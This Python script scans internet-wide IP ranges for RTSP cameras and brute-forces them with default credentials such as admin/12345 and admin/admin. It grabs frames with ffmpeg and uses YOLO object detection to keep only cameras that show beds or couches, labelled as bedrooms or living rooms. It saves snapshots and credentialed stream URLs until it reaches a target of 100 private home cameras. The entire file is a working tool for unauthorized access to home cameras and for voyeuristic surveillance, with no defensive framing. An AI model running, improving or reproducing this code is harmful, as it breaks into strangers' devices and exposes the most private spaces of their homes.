#!/usr/bin/env python3
"""
TITAN YOLO ROOM HUNTER v3 — BLAZING FAST
3-phase pipeline:
  P1: OPTIONS check on ALL IPs (single packet, 2s timeout) → filter live RTSP hosts
  P2: DESCRIBE with 3 no-auth + 2 auth paths → get stream URLs
  P3: ffmpeg frame grab + batch YOLO → filter bed/couch

All 42K masscan IPs processed in ~3-5 minutes.
"""

import asyncio, hashlib, json, os, re, subprocess, sys, time, random, ipaddress, shutil
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

BASE = Path(__file__).resolve().parent
RESULTS = BASE / "results"
FRAMES = BASE / "yolo_frames"
SNAPS = BASE / "web_snapshots"
MASSCAN = BASE.parent / "skills" / "masscan_results.txt"
for d in [RESULTS, FRAMES, SNAPS]: d.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE))
from cctv_config import GLOBAL_CIDRS

ROOM_CLASSES = {59: "bed", 57: "couch", 56: "chair", 62: "tv", 61: "toilet"}
PRIMARY = {"bed", "couch"}
CONF = 0.25
TARGET = 100

SKIP_IPS = set()
FOUND = OrderedDict()


def load_skip():
    for fn in ["yolo_rooms.json", "live_streams.json", "rtsp_blitz_live.json"]:
        p = RESULTS / fn
        if not p.exists(): continue
        try:
            d = json.load(open(p))
            for s in (d.get("streams", []) if isinstance(d, dict) else d):
                SKIP_IPS.add(s.get("ip", ""))
        except: pass
    # Also load existing yolo_rooms into FOUND
    p = RESULTS / "yolo_rooms.json"
    if p.exists():
        try:
            d = json.load(open(p))
            for s in d.get("streams", []):
                ip = s.get("ip", "")
                if ip: FOUND[ip] = s
        except: pass
    print(f"[SKIP] {len(SKIP_IPS)} known, {len(FOUND)} already in yolo_rooms")


def load_masscan_554():
    ips = []
    with open(MASSCAN) as f:
        for line in f:
            if "554/open" not in line: continue
            m = re.search(r'Host:\s+(\d+\.\d+\.\d+\.\d+)', line)
            if m and m.group(1) not in SKIP_IPS:
                ips.append(m.group(1))
    random.shuffle(ips)
    return ips


def gen_cidr_ips(count):
    all_c = []
    for v in GLOBAL_CIDRS.values(): all_c.extend(v)
    ips = set()
    for _ in range(count * 3):
        if len(ips) >= count: break
        try:
            n = ipaddress.IPv4Network(random.choice(all_c), strict=False)
            ip = str(n.network_address + random.randint(1, max(1, n.num_addresses - 2)))
            if ip not in SKIP_IPS and ip not in ips: ips.add(ip)
        except: pass
    return list(ips)


# ══════════════════════════════════════════════
# P1: FAST OPTIONS CHECK
# ══════════════════════════════════════════════

async def options_check(ip, sem):
    """Send RTSP OPTIONS — just check if port is live and speaks RTSP."""
    async with sem:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, 554), timeout=2)
            w.write(f"OPTIONS rtsp://{ip}:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
            await w.drain()
            data = await asyncio.wait_for(r.read(1024), timeout=2)
            w.close()
            if b"RTSP" in data:
                return ip
        except: pass
    return None


async def phase1(ips, sem):
    print(f"[P1] OPTIONS check on {len(ips)} IPs (sem={sem._value})...")
    t0 = time.time()
    live = []
    CHUNK = 10000
    for i in range(0, len(ips), CHUNK):
        chunk = ips[i:i+CHUNK]
        results = await asyncio.gather(*[options_check(ip, sem) for ip in chunk], return_exceptions=True)
        for r in results:
            if isinstance(r, str): live.append(r)
        print(f"  [{min(i+CHUNK,len(ips))}/{len(ips)}] {len(live)} live RTSP hosts ({time.time()-t0:.0f}s)")
    print(f"[P1] {len(live)} live hosts from {len(ips)} IPs in {time.time()-t0:.0f}s")
    return live


# ══════════════════════════════════════════════
# P2: DESCRIBE — get stream URLs
# ══════════════════════════════════════════════

def md5(s): return hashlib.md5(s.encode()).hexdigest()

async def describe(ip, path, user="", pw=""):
    url = f"rtsp://{ip}:554{path}"
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, 554), timeout=2.5)
        req = f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n"
        w.write(req.encode()); await w.drain()
        data = (await asyncio.wait_for(r.read(4096), timeout=2.5)).decode(errors="ignore")

        if "200 OK" in data and ("m=video" in data or "a=control" in data):
            w.close()
            u = f"rtsp://{ip}:554{path}" if not user else f"rtsp://{user}:{pw}@{ip}:554{path}"
            return {"ip": ip, "port": 554, "path": path, "user": user, "password": pw,
                    "auth": "none" if not user else "digest", "rtsp_url": u}

        if "401" in data and "Digest" in data and user:
            rm = re.search(r'realm="([^"]*)"', data)
            nm = re.search(r'nonce="([^"]*)"', data)
            if rm and nm:
                ha1 = md5(f"{user}:{rm.group(1)}:{pw}")
                ha2 = md5(f"DESCRIBE:{url}")
                resp = md5(f"{ha1}:{nm.group(1)}:{ha2}")
                auth = f'Digest username="{user}",realm="{rm.group(1)}",nonce="{nm.group(1)}",uri="{url}",response="{resp}"'
                w.write(f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {auth}\r\n\r\n".encode())
                await w.drain()
                d2 = (await asyncio.wait_for(r.read(4096), timeout=2.5)).decode(errors="ignore")
                if "200 OK" in d2:
                    w.close()
                    return {"ip": ip, "port": 554, "path": path, "user": user, "password": pw,
                            "auth": "digest", "rtsp_url": f"rtsp://{user}:{pw}@{ip}:554{path}"}
        w.close()
    except: pass
    return None


async def probe_host(ip, sem):
    async with sem:
        # No-auth paths first
        for p in ["/", "/stream1", "/live"]:
            r = await describe(ip, p)
            if r: return r
        # Auth paths
        for p in ["/Streaming/Channels/101", "/cam/realmonitor?channel=1&subtype=0"]:
            for u, pw in [("admin","12345"),("admin","admin"),("admin",""),("admin","888888"),("admin","1234")]:
                r = await describe(ip, p, u, pw)
                if r: return r
    return None


async def phase2(live_ips, sem):
    print(f"\n[P2] DESCRIBE {len(live_ips)} live hosts...")
    t0 = time.time()
    streams = []
    CHUNK = 3000
    for i in range(0, len(live_ips), CHUNK):
        chunk = live_ips[i:i+CHUNK]
        results = await asyncio.gather(*[probe_host(ip, sem) for ip in chunk], return_exceptions=True)
        for r in results:
            if isinstance(r, dict): streams.append(r)
        print(f"  [{min(i+CHUNK,len(live_ips))}/{len(live_ips)}] {len(streams)} streams ({time.time()-t0:.0f}s)")
    print(f"[P2] {len(streams)} valid streams in {time.time()-t0:.0f}s")
    return streams


# ══════════════════════════════════════════════
# P3: FRAME GRAB + YOLO
# ══════════════════════════════════════════════

_model = None
def yolo():
    global _model
    if not _model:
        from ultralytics import YOLO
        _model = YOLO(str(BASE.parent / "yolov8n.pt"))
    return _model


def grab(cam):
    ip, url = cam["ip"], cam["rtsp_url"]
    out = FRAMES / f"{ip.replace('.','_')}.jpg"
    try:
        r = subprocess.run(
            ["ffmpeg", "-y", "-rtsp_transport", "tcp", "-timeout", "5000000",
             "-i", url, "-frames:v", "1", "-update", "1",
             "-vf", "scale=640:-1", "-q:v", "3", str(out)],
            capture_output=True, timeout=10)
        if r.returncode == 0 and out.exists() and out.stat().st_size > 800:
            return cam, str(out)
    except: pass
    return cam, None


def phase3(streams):
    print(f"\n[P3] Frame grab + YOLO on {len(streams)} streams...")
    model = yolo()

    # Grab frames (16 parallel)
    t0 = time.time()
    grabbed = []
    with ThreadPoolExecutor(max_workers=16) as pool:
        for cam, path in pool.map(grab, streams):
            if path: grabbed.append((cam, path))

    print(f"  {len(grabbed)}/{len(streams)} frames grabbed in {time.time()-t0:.0f}s")
    if not grabbed:
        return 0

    # Batch YOLO
    t1 = time.time()
    paths = [p for _, p in grabbed]
    cams = [c for c, _ in grabbed]
    results = model(paths, verbose=False, conf=CONF)

    new = 0
    for cam, result in zip(cams, results):
        ip = cam["ip"]
        if ip in FOUND: continue

        dets = []
        for box in result.boxes:
            cid = int(box.cls[0])
            name = ROOM_CLASSES.get(cid)
            if name:
                dets.append({"name": name, "conf": round(float(box.conf[0]), 3)})

        names = {d["name"] for d in dets}
        if names & PRIMARY:
            room = "bedroom" if "bed" in names else "living_room"
            cam["yolo_tags"] = list(names)
            cam["yolo_conf"] = max(d["conf"] for d in dets)
            cam["room"] = room
            FOUND[ip] = cam
            new += 1

            safe = ip.replace(".", "_")
            src = FRAMES / f"{safe}.jpg"
            if src.exists():
                try: shutil.copy2(src, SNAPS / f"{safe}.jpg")
                except: pass

            tags = ", ".join(f"{d['name']}({d['conf']:.0%})" for d in dets)
            print(f"  *** ROOM #{len(FOUND)}: {ip} [{room}] — {tags}")
            save()

            if len(FOUND) >= TARGET: break

    print(f"[P3] +{new} rooms in {time.time()-t1:.0f}s | Total: {len(FOUND)}/{TARGET}")
    return new


def save():
    streams = []
    for s in FOUND.values():
        c = {k:v for k,v in s.items() if k != "sdp_snippet"}
        streams.append(c)
    with open(RESULTS / "yolo_rooms.json", "w") as f:
        json.dump({"streams": streams, "count": len(streams),
                    "updated": time.strftime("%Y-%m-%d %H:%M:%S")}, f, indent=2)


async def main():
    global TARGET
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", type=int, default=100)
    ap.add_argument("--sem", type=int, default=3000)
    ap.add_argument("--cidr", type=int, default=100000)
    args = ap.parse_args()
    TARGET = args.target

    print(f"{'='*60}")
    print(f"  TITAN YOLO ROOM HUNTER v3 — BLAZING FAST")
    print(f"  Target: {TARGET} bed/couch cameras")
    print(f"{'='*60}\n")

    load_skip()
    yolo()

    masscan_ips = load_masscan_554()
    print(f"[LOAD] {len(masscan_ips)} masscan 554-IPs\n")

    sem_p1 = asyncio.Semaphore(5000)   # very fast OPTIONS
    sem_p2 = asyncio.Semaphore(args.sem)  # DESCRIBE with auth

    rnd = 0
    while len(FOUND) < TARGET:
        rnd += 1

        if rnd == 1:
            ips = masscan_ips
            print(f"[ROUND {rnd}] {len(ips)} masscan IPs")
        else:
            ips = gen_cidr_ips(args.cidr)
            print(f"\n[ROUND {rnd}] {len(ips)} random CIDR IPs")

        # P1: OPTIONS
        live = await phase1(ips, sem_p1)
        if not live:
            print("[!] No live hosts, next round")
            continue

        # P2: DESCRIBE
        streams = await phase2(live, sem_p2)
        if not streams:
            print("[!] No streams, next round")
            continue

        # P3: YOLO
        phase3(streams)

        if len(FOUND) >= TARGET:
            break

    save()
    print(f"\n{'='*60}")
    print(f"  DONE: {len(FOUND)} room cameras (target: {TARGET})")
    print(f"  Results: {RESULTS / 'yolo_rooms.json'}")
    print(f"{'='*60}")


if __name__ == "__main__":
    asyncio.run(main())
